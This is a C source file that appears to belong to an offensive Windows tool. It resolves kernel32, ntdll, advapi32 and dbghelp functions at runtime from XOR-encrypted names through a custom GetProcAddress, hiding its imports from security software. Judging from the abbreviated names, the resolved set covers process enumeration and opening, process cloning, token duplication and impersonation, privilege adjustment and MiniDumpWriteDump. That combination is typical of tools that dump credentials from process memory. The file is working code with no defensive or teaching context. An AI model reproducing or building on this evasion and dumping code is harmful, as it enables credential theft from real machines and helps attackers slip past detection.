#include "api.h"
#include "utils.h"
#include "logger.h"
#include "defs.h"
#include "api_strings.h"

#define DECL_API_PTR(name) PFN_##name p##name = NULL

DECL_API_PTR(P32F);
DECL_API_PTR(P32N);
DECL_API_PTR(OP);
DECL_API_PTR(GPA);
DECL_API_PTR(NTCPX);
DECL_API_PTR(CTH);
DECL_API_PTR(OPTK);
DECL_API_PTR(DUPTOK);
DECL_API_PTR(IMP);
DECL_API_PTR(STT);
DECL_API_PTR(ATP);
DECL_API_PTR(LPVA);
DECL_API_PTR(MDWD);
DECL_API_PTR(GPID);

// internal function to resolve APIs
static BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char* enc, size_t len, void** fn) {
    char* name = xor_decrypt_string(enc, len, XOR_KEY, key_len);
    if (!name) return FALSE;

    *fn = (void*)CustomGetProcAddress(hMod, name);
    free(name);
    return (*fn != NULL);
}

// resolve all required APIs
BOOL ResolveAllApis(void) {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hDbghelp = LoadLibraryA("dbghelp.dll");

    if (!hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp) {
        log_error("Failed to load required DLLs.");
        return FALSE;
    }

    BOOL success =
        ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC), (void**)&pP32F) &&
        ResolveApiFromDll(hKernel32, P32N_ENC, sizeof(P32N_ENC), (void**)&pP32N) &&
        ResolveApiFromDll(hKernel32, OP_ENC, sizeof(OP_ENC), (void**)&pOP) &&
        ResolveApiFromDll(hKernel32, GPA_ENC, sizeof(GPA_ENC), (void**)&pGPA) &&
        ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX) &&
        ResolveApiFromDll(hKernel32, CTH_ENC, sizeof(CTH_ENC), (void**)&pCTH) &&
        ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC), (void**)&pOPTK) &&
        ResolveApiFromDll(hAdvapi32, DUPTOK_ENC, sizeof(DUPTOK_ENC), (void**)&pDUPTOK) &&
        ResolveApiFromDll(hAdvapi32, IMP_ENC, sizeof(IMP_ENC), (void**)&pIMP) &&
        ResolveApiFromDll(hAdvapi32, STT_ENC, sizeof(STT_ENC), (void**)&pSTT) &&
        ResolveApiFromDll(hAdvapi32, ATP_ENC, sizeof(ATP_ENC), (void**)&pATP) &&
        ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC), (void**)&pLPVA) &&
        ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), (void**)&pMDWD) &&
        ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID);

    return success;
}
